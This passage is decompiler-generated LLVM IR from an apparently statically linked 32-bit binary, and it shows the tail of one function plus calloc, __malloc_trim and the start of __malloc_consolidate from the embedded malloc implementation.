  store i32 %v3_80608be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80608c6

dec_label_pc_80608c6:                             ; preds = %dec_label_pc_8060161, %dec_label_pc_80608b5
  %v0_80608c9 = load i32, i32* @ebx, align 4
  store i32 %v0_80608c9, i32* %eax.global-to-local, align 4
  %v2_80608cb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80608cb, i32* @ebx, align 4
  store i32 %v0_8060130, i32* @esi, align 4
  store i32 %v0_806012f, i32* @edi, align 4
  store i32 %v0_806012e, i32* @ebp, align 4
  ret i32 %v0_80608c9

; uselistorder directives
  uselistorder i32 %v0_806088c, { 1, 0 }
  uselistorder i32 %v1_8060810, { 1, 0 }
  uselistorder i32 %v2_8060804, { 1, 0 }
  uselistorder i32 %v0_80607ef, { 1, 0 }
  uselistorder i32 %v0_80607ea, { 0, 2, 1 }
  uselistorder i32 %v1_8060781, { 1, 0, 2 }
  uselistorder i32 %v0_8060781, { 1, 0 }
  uselistorder i32 %v2_806076f, { 1, 0 }
  uselistorder i32 %v1_8060726, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8060714, { 1, 0, 2 }
  uselistorder i32 %v2_8060704, { 1, 2, 0 }
  uselistorder i32 %v2_80606ff, { 1, 0, 2 }
  uselistorder i32 %v1_80606ef, { 2, 1, 0 }
  uselistorder i8 %v0_80606bd, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80606a0, { 1, 0, 2 }
  uselistorder i32 %v0_8060762, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8060754, { 2, 0, 1 }
  uselistorder i32 %v8_8060670, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8060656, { 1, 0, 2 }
  uselistorder i32 %v3_8060656, { 1, 0 }
  uselistorder i32 %v1_8060624, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8060618, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8060614, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8060602, { 1, 0 }
  uselistorder i32 %v1_80605f2, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_80605e2, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_80605cb, { 1, 0 }
  uselistorder i32 %v2_80605bf, { 1, 0 }
  uselistorder i32 %v2_80605af, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8060593, { 1, 2, 0 }
  uselistorder i32 %v1_8060593, { 1, 0, 2 }
  uselistorder i32 %v1_8060592, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_806058c, { 1, 0 }
  uselistorder i32 %v2_806056a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_806055e, { 2, 1, 0 }
  uselistorder i32 %v8_8060549, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8060530, { 1, 0, 2 }
  uselistorder i32 %v0_80604d3, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80604a2, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8060495, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_806047b, { 1, 0, 2 }
  uselistorder i32 %v1_8060415, { 1, 0 }
  uselistorder i32 %v3_806040a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8060404, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_806040112, { 1, 0 }
  uselistorder i32 %v2_80603f6, { 1, 0 }
  uselistorder i32 %v1_80603da, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80603d6, { 2, 1, 0 }
  uselistorder i32 %v1_80603d2, { 1, 0 }
  uselistorder i32 %v1_80603cd, { 2, 1, 0 }
  uselistorder i32 %v2_80603bc, { 1, 0 }
  uselistorder i32 %v1_80603b9, { 1, 2, 0, 3 }
  uselistorder i32 %v4_8060357, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_80603a2, { 1, 0 }
  uselistorder i32 %v0_806036d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8060343, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8060310, { 0, 2, 1 }
  uselistorder i32 %v2_80602f4, { 1, 0 }
  uselistorder i32 %v1_80602ea, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80602e5.lcssa, { 1, 0 }
  uselistorder i32 %v3_80602d5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80602cc, { 1, 0, 2 }
  uselistorder i32 %v3_80602af, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_80602a8, { 1, 0, 2 }
  uselistorder i32 %v2_8060290, { 2, 1, 0 }
  uselistorder i32 %v0_806027c, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8060242, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8060310118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8060310109, { 1, 0, 2 }
  uselistorder i32 %v3_80601ef, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80601e1, { 2, 1, 0 }
  uselistorder i32 %v2_80601bc, { 2, 1, 0 }
  uselistorder i8 %v0_806018a, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_806052a, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_8060173, { 1, 2, 0 }
  uselistorder i32 %v0_806015c, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 19, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 11, 4, 12, 5, 6, 7, 8, 9, 10, 0, 13 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75 }
  uselistorder i8 -2, { 0, 1, 4, 2, 5, 3 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_807f760.697, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0, 4, 3, 2 }
  uselistorder i32 134738996, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_807f440.685, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_807f42c.682 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_807f42c.682 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80608c6, { 1, 0 }
  uselistorder label %dec_label_pc_80608b5, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80608a8, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80608a4, { 1, 0 }
  uselistorder label %dec_label_pc_806089a, { 1, 0 }
  uselistorder label %dec_label_pc_8060845, { 1, 0 }
  uselistorder label %dec_label_pc_80607ea, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_806077c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060777, { 1, 0 }
  uselistorder label %dec_label_pc_806075b, { 1, 0 }
  uselistorder label %dec_label_pc_8060704, { 1, 0 }
  uselistorder label %dec_label_pc_80606ed, { 1, 0 }
  uselistorder label %dec_label_pc_80606d6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806068d, { 1, 0 }
  uselistorder label %dec_label_pc_806064b, { 1, 0 }
  uselistorder label %dec_label_pc_80605e2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8060581, { 1, 0 }
  uselistorder label %dec_label_pc_8060495, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806048d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060401, { 1, 0 }
  uselistorder label %dec_label_pc_8060406.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80603da, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060361, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_80602e8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80602d1, { 1, 0 }
  uselistorder label %dec_label_pc_806023f, { 1, 0 }
  uselistorder label %dec_label_pc_8060310.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806020c, { 1, 0 }
  uselistorder label %dec_label_pc_806018a, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80608d0 = load i32, i32* @edi, align 4
  %v0_80608d2 = load i32, i32* @ebx, align 4
  %v12_80608d3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80608d6 = trunc i64 %arg1 to i32
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_80608e0 = sdiv i64 %sext, 4294967296
  %v3_80608e0 = sext i32 %arg2 to i64
  %v4_80608e0 = mul nsw i64 %v3_80608e0, %v2_80608e0
  %v5_80608e0 = trunc i64 %v4_80608e0 to i32
  store i32 %v5_80608e0, i32* @ebx, align 4
  %v2_80608e3 = icmp eq i32 %v4_80608d6, 0
  br i1 %v2_80608e3, label %dec_label_pc_8060905, label %dec_label_pc_80608e7

dec_label_pc_80608e7:                             ; preds = %entry
  store i32 %v4_80608d6, i32* @edi, align 4
  %div = udiv i32 %v5_80608e0, %v4_80608d6
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_80608ef = icmp eq i32 %div, %arg2
  br i1 %v12_80608ef, label %dec_label_pc_8060905, label %dec_label_pc_80608f3

dec_label_pc_80608f3:                             ; preds = %dec_label_pc_80608e7
  %v1_80608f3 = call i32 @__errno_location(i32 %v0_80608d2)
  store i32 %v1_80608f3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80608fa = inttoptr i32 %v1_80608f3 to i32*
  store i32 12, i32* %v1_80608fa, align 4
  br label %dec_label_pc_80609bb

dec_label_pc_8060905:                             ; preds = %dec_label_pc_80608e7, %entry
  store i32 %v12_80608d3, i32* %eax.global-to-local, align 4
  %v4_8060915 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134589241, i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v4_8060915, i32* %eax.global-to-local, align 4
  %v1_8060921 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v1_8060921, i32* %eax.global-to-local, align 4
  %v0_8060926 = load i32, i32* @ebx, align 4
  %v1_8060929 = call i32 @malloc(i32 %v0_8060926)
  store i32 %v1_8060929, i32* %eax.global-to-local, align 4
  %v1_8060931 = icmp eq i32 %v1_8060929, 0
  store i32 %v1_8060929, i32* @ebx, align 4
  br i1 %v1_8060931, label %dec_label_pc_80609aa, label %dec_label_pc_8060937

dec_label_pc_8060937:                             ; preds = %dec_label_pc_8060905
  %v1_8060937 = add i32 %v1_8060929, -4
  %v2_8060937 = inttoptr i32 %v1_8060937 to i32*
  %v3_8060937 = load i32, i32* %v2_8060937, align 4
  store i32 %v3_8060937, i32* %eax.global-to-local, align 4
  %v2_806093a = and i32 %v3_8060937, 2
  %v3_806093a = icmp eq i32 %v2_806093a, 0
  %v1_806093c = icmp eq i1 %v3_806093a, false
  br i1 %v1_806093c, label %dec_label_pc_80609aa, label %dec_label_pc_806093e

dec_label_pc_806093e:                             ; preds = %dec_label_pc_8060937
  %v1_806093e2 = add i32 %v3_8060937, -4
  %v1_8060941 = and i32 %v1_806093e2, -4
  %v2_8060946 = udiv i32 %v1_8060941, 4
  store i32 %v2_8060946, i32* %eax.global-to-local, align 4
  %v5_8060949 = icmp ult i32 %v1_8060941, 36
  %tmp = and i32 %v1_806093e2, -4
  %tmp14 = icmp eq i32 %tmp, 36
  %v2_806094c = or i1 %v5_8060949, %tmp14
  br i1 %v2_806094c, label %dec_label_pc_806095d, label %dec_label_pc_806094e

dec_label_pc_806094e:                             ; preds = %dec_label_pc_806093e
  %v3_8060953 = inttoptr i32 %v1_8060929 to i8*
  %v4_8060953 = call i32 @__GI_memset(i8* %v3_8060953, i32 0, i32 %v1_8060941)
  store i32 %v4_8060953, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80609aa

dec_label_pc_806095d:                             ; preds = %dec_label_pc_806093e
  %v5_806095d = icmp ult i32 %v1_8060941, 16
  %tmp15 = and i32 %v1_806093e2, -4
  %tmp16 = icmp eq i32 %tmp15, 16
  %v1_8060960 = inttoptr i32 %v1_8060929 to i32*
  store i32 0, i32* %v1_8060960, align 4
  %v0_8060966 = load i32, i32* @ebx, align 4
  %v1_8060966 = add i32 %v0_8060966, 4
  %v2_8060966 = inttoptr i32 %v1_8060966 to i32*
  store i32 0, i32* %v2_8060966, align 4
  %v0_806096d = load i32, i32* @ebx, align 4
  %v1_806096d = add i32 %v0_806096d, 8
  %v2_806096d = inttoptr i32 %v1_806096d to i32*
  store i32 0, i32* %v2_806096d, align 4
  %v2_8060974 = or i1 %v5_806095d, %tmp16
  br i1 %v2_8060974, label %dec_label_pc_80609aa, label %dec_label_pc_8060976

dec_label_pc_8060976:                             ; preds = %dec_label_pc_806095d
  %v0_8060976 = load i32, i32* %eax.global-to-local, align 4
  %v0_8060979 = load i32, i32* @ebx, align 4
  %v1_8060979 = add i32 %v0_8060979, 12
  %v2_8060979 = inttoptr i32 %v1_8060979 to i32*
  store i32 0, i32* %v2_8060979, align 4
  %v0_8060980 = load i32, i32* @ebx, align 4
  %v1_8060980 = add i32 %v0_8060980, 16
  %v2_8060980 = inttoptr i32 %v1_8060980 to i32*
  store i32 0, i32* %v2_8060980, align 4
  %tmp17 = icmp ult i32 %v0_8060976, 7
  br i1 %tmp17, label %dec_label_pc_80609aa, label %dec_label_pc_8060989

dec_label_pc_8060989:                             ; preds = %dec_label_pc_8060976
  %v0_8060989 = load i32, i32* %eax.global-to-local, align 4
  %v0_806098c = load i32, i32* @ebx, align 4
  %v1_806098c = add i32 %v0_806098c, 20
  %v2_806098c = inttoptr i32 %v1_806098c to i32*
  store i32 0, i32* %v2_806098c, align 4
  %v0_8060993 = load i32, i32* @ebx, align 4
  %v1_8060993 = add i32 %v0_8060993, 24
  %v2_8060993 = inttoptr i32 %v1_8060993 to i32*
  store i32 0, i32* %v2_8060993, align 4
  %tmp18 = icmp ult i32 %v0_8060989, 9
  br i1 %tmp18, label %dec_label_pc_80609aa, label %dec_label_pc_806099c

dec_label_pc_806099c:                             ; preds = %dec_label_pc_8060989
  %v0_806099c = load i32, i32* @ebx, align 4
  %v1_806099c = add i32 %v0_806099c, 28
  %v2_806099c = inttoptr i32 %v1_806099c to i32*
  store i32 0, i32* %v2_806099c, align 4
  %v0_80609a3 = load i32, i32* @ebx, align 4
  %v1_80609a3 = add i32 %v0_80609a3, 32
  %v2_80609a3 = inttoptr i32 %v1_80609a3 to i32*
  store i32 0, i32* %v2_80609a3, align 4
  br label %dec_label_pc_80609aa

dec_label_pc_80609aa:                             ; preds = %dec_label_pc_8060989, %dec_label_pc_8060976, %dec_label_pc_806095d, %dec_label_pc_8060937, %dec_label_pc_8060905, %dec_label_pc_806094e, %dec_label_pc_806099c
  store i32 %v12_80608d3, i32* %eax.global-to-local, align 4
  %v3_80609b3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_80609b3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80609bb

dec_label_pc_80609bb:                             ; preds = %dec_label_pc_80608f3, %dec_label_pc_80609aa
  %v0_80609be = load i32, i32* @ebx, align 4
  store i32 %v0_80609be, i32* %eax.global-to-local, align 4
  store i32 %v0_80608d2, i32* @ebx, align 4
  store i32 %v0_80608d0, i32* @edi, align 4
  ret i32 %v0_80609be

; uselistorder directives
  uselistorder i32 %v1_8060941, { 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80609bb, { 1, 0 }
  uselistorder label %dec_label_pc_80609aa, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_80609c5 = load i32, i32* @edx, align 4
  store i32 %v0_80609c5, i32* %ebp.global-to-local, align 4
  %v0_80609c8 = load i32, i32* @esi, align 4
  %v0_80609c9 = load i32, i32* @ebx, align 4
  %v1_80609cd = add i32 %v0_80609c5, 860
  %v2_80609cd = inttoptr i32 %v1_80609cd to i32*
  %v3_80609cd = load i32, i32* %v2_80609cd, align 4
  store i32 %v3_80609cd, i32* @ecx, align 4
  %v1_80609d3 = add i32 %v0_80609c5, 44
  %v2_80609d3 = inttoptr i32 %v1_80609d3 to i32*
  %v3_80609d3 = load i32, i32* %v2_80609d3, align 4
  %v1_80609d6 = add i32 %v3_80609d3, 4
  %v2_80609d6 = inttoptr i32 %v1_80609d6 to i32*
  %v3_80609d6 = load i32, i32* %v2_80609d6, align 4
  %v1_80609d9 = and i32 %v3_80609d6, -4
  store i32 %v1_80609d9, i32* @esi, align 4
  %v1_80609de = load i32, i32* @eax, align 4
  %v2_80609de = add i32 %v3_80609cd, -17
  %v2_80609e0 = add i32 %v2_80609de, %v1_80609d9
  %v3_80609e0 = sub i32 %v2_80609e0, %v1_80609de
  %div = udiv i32 %v3_80609e0, %v3_80609cd
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_80609e8 = add i32 %div, -1
  %v4_80609eb = mul i32 %v1_80609e8, %v3_80609cd
  store i32 %v4_80609eb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80609eb, 1
  br i1 %tmp11, label %dec_label_pc_8060a47, label %dec_label_pc_80609f2

dec_label_pc_80609f2:                             ; preds = %entry
  %v1_80609f7 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80609f7, i32* %edi.global-to-local, align 4
  %v0_8060a01 = load i32, i32* @esi, align 4
  store i32 %v0_8060a01, i32* %eax.global-to-local, align 4
  %v1_8060a03 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8060a03 = add i32 %v1_8060a03, 44
  %v3_8060a03 = inttoptr i32 %v2_8060a03 to i32*
  %v4_8060a03 = load i32, i32* %v3_8060a03, align 4
  %v5_8060a03 = add i32 %v4_8060a03, %v0_8060a01
  store i32 %v5_8060a03, i32* %eax.global-to-local, align 4
  %v12_8060a06 = icmp eq i32 %v1_80609f7, %v5_8060a03
  %v1_8060a08 = icmp eq i1 %v12_8060a06, false
  br i1 %v1_8060a08, label %dec_label_pc_8060a47, label %dec_label_pc_8060a0a

dec_label_pc_8060a0a:                             ; preds = %dec_label_pc_80609f2
  %v1_8060a0d = sub i32 0, %v4_80609eb
  store i32 %v1_8060a0d, i32* @ebx, align 4
  %v1_8060a10 = call i32 @__GI_sbrk(i32 %v1_8060a0d)
  store i32 %v1_8060a10, i32* %eax.global-to-local, align 4
  %v1_8060a1c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8060a1c, i32* %eax.global-to-local, align 4
  %v10_8060a24 = icmp eq i32 %v1_8060a1c, -1
  br i1 %v10_8060a24, label %dec_label_pc_8060a47, label %dec_label_pc_8060a29

dec_label_pc_8060a29:                             ; preds = %dec_label_pc_8060a0a
  %v0_8060a29 = load i32, i32* %edi.global-to-local, align 4
  %v2_8060a2b = sub i32 %v0_8060a29, %v1_8060a1c
  %v12_8060a2b = icmp eq i32 %v2_8060a2b, 0
  store i32 %v2_8060a2b, i32* @ecx, align 4
  br i1 %v12_8060a2b, label %dec_label_pc_8060a47, label %dec_label_pc_8060a2f

dec_label_pc_8060a2f:                             ; preds = %dec_label_pc_8060a29
  %v0_8060a2f = load i32, i32* %ebp.global-to-local, align 4
  %v1_8060a2f = add i32 %v0_8060a2f, 44
  %v2_8060a2f = inttoptr i32 %v1_8060a2f to i32*
  %v3_8060a2f = load i32, i32* %v2_8060a2f, align 4
  store i32 %v3_8060a2f, i32* %eax.global-to-local, align 4
  %v0_8060a32 = load i32, i32* @esi, align 4
  %v2_8060a32 = sub i32 %v0_8060a32, %v2_8060a2b
  store i32 %v2_8060a32, i32* %esi.global-to-local, align 4
  %v1_8060a34 = add i32 %v0_8060a2f, 872
  %v2_8060a34 = inttoptr i32 %v1_8060a34 to i32*
  %v3_8060a34 = load i32, i32* %v2_8060a34, align 4
  %v5_8060a34 = sub i32 %v3_8060a34, %v2_8060a2b
  store i32 %v5_8060a34, i32* %v2_8060a34, align 4
  %v0_8060a3a = load i32, i32* %esi.global-to-local, align 4
  %v1_8060a3a = or i32 %v0_8060a3a, 1
  store i32 %v1_8060a3a, i32* %esi.global-to-local, align 4
  %v1_8060a3d = load i32, i32* %eax.global-to-local, align 4
  %v2_8060a3d = add i32 %v1_8060a3d, 4
  %v3_8060a3d = inttoptr i32 %v2_8060a3d to i32*
  store i32 %v1_8060a3a, i32* %v3_8060a3d, align 4
  br label %dec_label_pc_8060a49

dec_label_pc_8060a47:                             ; preds = %dec_label_pc_8060a29, %dec_label_pc_8060a0a, %dec_label_pc_80609f2, %entry
  br label %dec_label_pc_8060a49

dec_label_pc_8060a49:                             ; preds = %dec_label_pc_8060a2f, %dec_label_pc_8060a47
  %storemerge = phi i32 [ 1, %dec_label_pc_8060a2f ], [ 0, %dec_label_pc_8060a47 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80609c9, i32* @ebx, align 4
  store i32 %v0_80609c8, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8060a1c, { 1, 0, 2 }
  uselistorder i32 %v4_80609eb, { 1, 2, 0 }
  uselistorder i32 %v3_80609cd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80609c5, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8060a49, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8060a51 = load i32, i32* @ebp, align 4
  %v0_8060a52 = load i32, i32* @edi, align 4
  %v0_8060a53 = load i32, i32* @esi, align 4
  %v0_8060a54 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8060a5c = load i32, i32* %arg1, align 4
  store i32 %v2_8060a5c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8060a63 = icmp eq i32 %v2_8060a5c, 0
  br i1 %v1_8060a63, label %dec_label_pc_8060b8c.preheader, label %dec_label_pc_8060a6b

dec_label_pc_8060b8c.preheader:                   ; preds = %entry
  %v3_8060b81 = add i32 %tmp11, 44
  br label %dec_label_pc_8060b7d

dec_label_pc_8060a6b:                             ; preds = %entry
  %v1_8060a6f = and i32 %v2_8060a5c, -3
  store i32 %v1_8060a6f, i32* %arg1, align 4
  %v1_8060a74 = add i32 %tmp11, 52
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8060a90 = udiv i32 %v1_8060a6f, 8
  %v2_8060a93 = mul nuw i32 %v2_8060a90, 4
  %v3_8060a93 = add i32 %tmp11, -4
  %v4_8060a93 = add i32 %v3_8060a93, %v2_8060a93
  store i32 %v4_8060a93, i32* %eax.global-to-local, align 4
  %v2_8060b5a = add i32 %tmp11, 44
  %v3_8060b5a = inttoptr i32 %v2_8060b5a to i32*
  %v1_8060b2d = add i32 %tmp11, 60
  %v2_8060b2d = inttoptr i32 %v1_8060b2d to i32*
  br label %dec_label_pc_8060a9b

dec_label_pc_8060a9b:                             ; preds = %dec_label_pc_8060b73, %dec_label_pc_8060a6b
  %v0_8060aa9.in = phi i32 [ %tmp11, %dec_label_pc_8060a6b ], [ %v0_8060aa9, %dec_label_pc_8060b73 ]
  %v0_8060aa9 = add i32 %v0_8060aa9.in, 4
  store i32 %v0_8060aa9, i32* %eax.global-to-local, align 4
  %v1_8060a9f = inttoptr i32 %v0_8060aa9 to i32*
  %v2_8060a9f = load i32, i32* %v1_8060a9f, align 4
  store i32 %v2_8060a9f, i32* @ecx, align 4
  %v1_8060aa1 = icmp eq i32 %v2_8060a9f, 0
  br i1 %v1_8060aa1, label %dec_label_pc_8060b69, label %dec_label_pc_8060aa9

dec_label_pc_8060aa9:                             ; preds = %dec_label_pc_8060a9b
  store i32 0, i32* %v1_8060a9f, align 4
  %v0_8060aaf.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8060aaf

dec_label_pc_8060aaf:                             ; preds = %dec_label_pc_8060b5d, %dec_label_pc_8060aa9
  %v0_8060acc = phi i32 [ %v3_8060aaf, %dec_label_pc_8060b5d ], [ %v0_8060aaf.pre, %dec_label_pc_8060aa9 ]
  %v1_8060aaf = add i32 %v0_8060acc, 8
  %v2_8060aaf = inttoptr i32 %v1_8060aaf to i32*
  %v3_8060aaf = load i32, i32* %v2_8060aaf, align 4
  store i32 %v3_8060aaf, i32* %edx.global-to-local, align 4
  %v1_8060ab6 = add i32 %v0_8060acc, 4
  %v2_8060ab6 = inttoptr i32 %v1_8060ab6 to i32*
  %v3_8060ab6 = load i32, i32* %v2_8060ab6, align 4
  store i32 %v3_8060ab6, i32* %eax.global-to-local, align 4
  %v1_8060abb = and i32 %v3_8060ab6, -2
  store i32 %v1_8060abb, i32* @edi, align 4
  %v2_8060abe = urem i32 %v3_8060ab6, 2
  %v3_8060abe = icmp eq i32 %v2_8060abe, 0
  %v2_8060ac0 = add i32 %v1_8060abb, %v0_8060acc
  store i32 %v2_8060ac0, i32* @ebx, align 4
  %v1_8060ac3 = add i32 %v2_8060ac0, 4
  %v2_8060ac3 = inttoptr i32 %v1_8060ac3 to i32*
  %v3_8060ac3 = load i32, i32* %v2_8060ac3, align 4
  store i32 %v3_8060ac3, i32* %edx.global-to-local, align 4
  %v1_8060aca = icmp eq i1 %v3_8060abe, false
  br i1 %v1_8060aca, label %dec_label_pc_8060aec, label %dec_label_pc_8060acc

dec_label_pc_8060acc:                             ; preds = %dec_label_pc_8060aaf
  %v1_8060acc = inttoptr i32 %v0_8060acc to i32*
  %v2_8060acc = load i32, i32* %v1_8060acc, align 4
  store i32 %v2_8060acc, i32* @ebp, align 4
  %v2_8060ad0 = sub i32 %v0_8060acc, %v2_8060acc
  store i32 %v2_8060ad0, i32* %eax.global-to-local, align 4
  %v1_8060ad2 = add i32 %v2_8060ad0, 8
  %v2_8060ad2 = inttoptr i32 %v1_8060ad2 to i32*
  %v3_8060ad2 = load i32, i32* %v2_8060ad2, align 4
  store i32 %v3_8060ad2, i32* @esi, align 4
  %v1_8060ad5 = add i32 %v2_8060ad0, 12
  %v2_8060ad5 = inttoptr i32 %v1_8060ad5 to i32*
  %v3_8060ad5 = load i32, i32* %v2_8060ad5, align 4
  store i32 %v3_8060ad5, i32* %edx.global-to-local, align 4
  %v1_8060ad8 = add i32 %v3_8060ad2, 12
  %v2_8060ad8 = inttoptr i32 %v1_8060ad8 to i32*
  %v3_8060ad8 = load i32, i32* %v2_8060ad8, align 4
  store i32 %v3_8060ad8, i32* @ecx, align 4
  %v12_8060adb = icmp eq i32 %v3_8060ad8, %v2_8060ad0
  %v1_8060add = icmp eq i1 %v12_8060adb, false
  br i1 %v1_8060add, label %dec_label_pc_8060b1c, label %dec_label_pc_8060adf

dec_label_pc_8060adf:                             ; preds = %dec_label_pc_8060acc
  %v1_8060adf = add i32 %v3_8060ad5, 8
  %v2_8060adf = inttoptr i32 %v1_8060adf to i32*
  %v3_8060adf = load i32, i32* %v2_8060adf, align 4
  %v15_8060adf = icmp eq i32 %v3_8060adf, %v3_8060ad8
  %v1_8060ae2 = icmp eq i1 %v15_8060adf, false
  br i1 %v1_8060ae2, label %dec_label_pc_8060b1c, label %dec_label_pc_8060ae4

dec_label_pc_8060ae4:                             ; preds = %dec_label_pc_8060adf
  %v2_8060ae4 = add i32 %v2_8060acc, %v1_8060abb
  store i32 %v2_8060ae4, i32* @edi, align 4
  store i32 %v3_8060ad5, i32* %v2_8060ad8, align 4
  %v0_8060ae9 = load i32, i32* @esi, align 4
  %v1_8060ae9 = load i32, i32* %edx.global-to-local, align 4
